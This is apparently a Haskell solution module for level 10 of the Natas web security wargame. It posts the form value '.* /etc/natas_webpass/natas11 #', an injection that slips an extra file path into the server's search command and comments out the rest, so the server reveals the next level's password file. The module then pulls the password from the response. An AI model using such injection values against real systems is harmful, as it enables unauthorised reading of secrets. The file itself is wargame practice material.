{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas10 where

import           Data.Maybe   (catMaybes)

import qualified Data.Text    as T
import           Safe         (lastMay)

import           Network.Wreq (partBS)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let needle = ".* /etc/natas_webpass/natas11 #"
      form = partBS "needle" needle
  req <- postLevel 10 form
  let body = reqBody req
      match = catMaybes (workupBody' (fmap lastMay) body)
  pure $ penultimateMay match >>= (lastMay . T.splitOn ":")
